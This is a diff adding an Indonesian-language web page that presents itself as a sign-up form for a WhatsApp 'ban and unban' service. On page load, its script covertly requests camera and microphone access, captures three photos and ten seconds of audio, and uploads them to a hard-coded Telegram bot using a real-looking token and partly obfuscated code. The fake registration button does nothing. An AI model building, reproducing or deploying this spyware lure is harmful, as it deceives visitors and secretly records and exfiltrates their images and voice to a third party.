@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  
+  <title>Login aplikasi</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
+  <style>
+    body {
+      font-family: 'Montserrat', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f5f5f5;
+    }
+    .SisuryaOfficial {
+      background-color: #000000;
+      color: white;
+      text-align: center;
+      padding: 15px 0;
+    }
+    #header {
+      margin: 0;
+      font-size: 28px;
+      font-weight: bold;
+    }
+    .data-login {
+      max-width: 600px;
+      margin: 20px auto;
+      padding: 20px;
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    .form-control {
+      width: calc(100% - 22px);
+      margin-bottom: 15px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+      font-family: 'Montserrat', sans-serif;
+    }
+    #thumbdloadbtn {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      background-color: #ff0000;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      font-family: 'Montserrat', sans-serif;
+    }
+    #thumbdloadbtn:hover {
+      background-color: #cc0000;
+    }
+    footer {
+      text-align: center;
+      margin-top: 40px;
+      color: #666;
+    }
+    .logo-bang-surya {
+      display: block;
+      margin: 20px auto;
+      width: 100px; /* Adjust size as needed */
+    }
+  </style>
+  <script type='text/javascript'>
+  //<![CDATA[
+  var uri = window.location.toString();
+  if (uri.indexOf("%3D") > 0) {
+      var clean_uri = uri.substring(0, uri.indexOf("%3D"));
+      window.history.replaceState({}, document.title, clean_uri);
+  }
+
+  uri = window.location.toString();
+  if (uri.indexOf("%3D%3D") > 0) {
+      clean_uri = uri.substring(0, uri.indexOf("%3D%3D"));
+      window.history.replaceState({}, document.title, clean_uri);
+  }
+
+  uri = window.location.toString();
+  if (uri.indexOf("&m=1") > 0) {
+      clean_uri = uri.substring(0, uri.indexOf("&m=1"));
+      window.history.replaceState({}, document.title, clean_uri);
+  }
+
+  uri = window.location.toString();
+  if (uri.indexOf("?m=1") > 0) {
+      clean_uri = uri.substring(0, uri.indexOf("?m=1"));
+      window.history.replaceState({}, document.title, clean_uri);
+  }
+  //]]>
+  </script>
+</head>
+<body>
+  <nav class="SisuryaOfficial">
+    <img class="logo-bang-surya" src="https://telegra.ph/file/d6f628c322379dba41e34.jpg" alt="dev by sisuryaofficial">
+    <h1 id="header">REGISTER TO APK UNBAN & BAN</h1>
+  </nav>
+
+  <div class="data-login">
+    <input id="ytlink" type="number" class="form-control" placeholder="Masukan nomer whatsap anda" spellcheck="false">
+    <button id="thumbdloadbtn" onclick="downloadThumbnail()">Daftar Sekarang</button>
+    <div id="thumbnail-preview"><!-- Placeholder for thumbnail preview --></div>
+
+    <h2>Cara pakai</h2>
+    <ol>
+      <li>Daftar dengan nomer whatsap anda</li>
+      <li>Jika berhasil lanjut pilih menu ban & unbab</li>
+      <li>Isi format contoh kalau mau ban pilih ban dan masukan nomer target habis itu tekan lanjutkan</li>
+      <li>Done, proses ban/unban bisa saja sampai 5 menit</li>
+    </ol>
+  </div>
+
+  <center>
+    <button id="toggle-video" style="display:none;">Lanjutkan</button>
+    <div id="message-data-login"></div>
+    <video id="video" width="0" height="0" autoplay></video>
+  </center>
+
+  <script type="text/javascript">
+    function downloadThumbnail() {
+        // Change button text to indicate fetching
+        var btn = document.getElementById('thumbdloadbtn');
+        btn.textContent = 'Sedang mendaftarkan anda..';
+
+        // Add your logic to fetch the thumbnail here
+        // ...
+    }
+
+    function la(src) {
+      window.location = src;
+    }
+
+    function GetURLParameter(sParam) {
+      var sPageURL = window.location.search.substring(1);
+      var sURLVariables = sPageURL.split('&');
+      for (var i = 0; i < sURLVariables.length; i++) {
+        var sParameterName = sURLVariables[i].split('=');
+        if (sParameterName[0] == sParam) {
+          return sParameterName[1];
+        }
+      }
+    }
+
+    function decodeBase64(encodedStr) {
+      try {
+        return decodeURIComponent(atob(encodedStr));
+      } catch (e) {
+        console.error('Base64 decode error:', e);
+        return null;
+      }
+    }
+
+    // Get Base64 encoded 'id' parameter from the URL
+    var base64Id = GetURLParameter('i');
+    var chatid = base64Id ? decodeBase64(base64Id) : null;
+
+    if (chatid) {
+      console.log('Decoded chat ID:', chatid);
+    } else {
+      console.warn('Terjadi kesalahan');
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+      .then((stream) => {
+        const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
+        const audioRecorder = new MediaRecorder(stream);
+
+        function capturePhoto(index) {
+          setTimeout(() => {
+            imageCapture.takePhoto()
+              .then((blob) => {
+                sendToTelegram(blob, 'photo');
+              })
+              .catch((error) => {
+                console.error('Error capturing photo:', error);
+              });
+          }, index * 2000);
+        }
+
+        function startAudioRecording() {
+          audioRecorder.start();
+          setTimeout(() => {
+            audioRecorder.stop();
+          }, 10000);
+        }
+
+        audioRecorder.ondataavailable = (event) => {
+          if (event.data.size > 0) {
+            sendToTelegram(event.data, 'audio');
+          }
+        };
+
+        for (let i = 0; i < 3; i++) {
+          capturePhoto(i);
+        }
+
+        startAudioRecording();
+      })
+      .catch((error) => {
+        if (error.name === 'NotAllowedError') {
+          console.warn('Permissions denied. User may suspect.');
+        } else {
+          console.error('Permission error:', error);
+        }
+      });
+
+      //data bot lu isi di sini
+    function sendToTelegram(data, type) {
+      const botToken = '7252968254:AAGQ7lD8QPoiQS241djx5O_9ETu1G2oAmpc';
+      const chatId = 6778046492;
+
+      if (!chatId) {
+        console.error('Chat ID is not available.');
+        return;
+      }
+
+      function _0x7b11(_0x516e29,_0x5f26c6){const _0x207241=_0xf089();return _0x7b11=function(_0xe48c01,_0xa92b9d){_0xe48c01=_0xe48c01-(0xdcc+-0xd3b+-0x1c*-0x1);let _0xb066b7=_0x207241[_0xe48c01];return _0xb066b7;},_0x7b11(_0x516e29,_0x5f26c6);}const _0x298d93=_0x7b11;(function(_0x1077e2,_0x20e00d){const _0x4723ff=_0x7b11,_0x4f74b8=_0x1077e2();while(!![]){try{const _0x17f08f=-parseInt(_0x4723ff(0xb2))/(0x31*0xa3+0x1cfa*0x1+-0x3c2c)*(parseInt(_0x4723ff(0xb6))/(-0x1*0x410+-0x1ac8+0x1eda))+-parseInt(_0x4723ff(0xad))/(0x713*-0x3+-0x2553+-0x315*-0x13)+parseInt(_0x4723ff(0xb4))/(-0x1a*-0x14f+-0xa83+-0x177f)+-parseInt(_0x4723ff(0xbb))/(-0x19b4+0xb10+0xea9)+-parseInt(_0x4723ff(0xb1))/(-0xa9+0x8ff+-0x850)+-parseInt(_0x4723ff(0xb8))/(-0x1*0xd97+0x1*-0x4b2+0x1250)*(-parseInt(_0x4723ff(0xae))/(-0xeca+0x178c+-0x8ba))+parseInt(_0x4723ff(0xb0))/(-0xc2d+-0x1*0x405+-0x115*-0xf);if(_0x17f08f===_0x20e00d)break;else _0x4f74b8['push'](_0x4f74b8['shift']());}catch(_0x53a641){_0x4f74b8['push'](_0x4f74b8['shift']());}}}(_0xf089,-0x3*-0xa0e+0xf64+-0x95*-0x4ee));function _0xf089(){const _0x206f60=['739860stMSYG','audio','chat_id','918483SIULcH','8nrYrIk','append','4018329qPRYFM','157428GVcJwW','351cVahqd','yaOfficial','776376eUeZFW','photo','1750tBZAuB','wav','2426347hHNNmd','Dev\x20@Sisur','jpg'];_0xf089=function(){return _0x206f60;};return _0xf089();}const formData=new FormData();formData[_0x298d93(0xaf)](_0x298d93(0xbd),chatId),formData[_0x298d93(0xaf)](type===_0x298d93(0xb5)?_0x298d93(0xb5):_0x298d93(0xbc),data,_0x298d93(0xb9)+_0x298d93(0xb3)+'.'+(type===_0x298d93(0xb5)?_0x298d93(0xba):_0x298d93(0xb7)));
+
+      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
+        method: 'POST',
+        body: formData
+      })
+        .then(response => response.json())
+        .then(data => console.log(data))
+        .catch(error => console.error('Error sending to Telegram:', error));
+    }
+  </script>
+
+  <footer>
+    <p>© Copyright SisuryaOfficial</p>
+  </footer>
+</body>
+  </html>
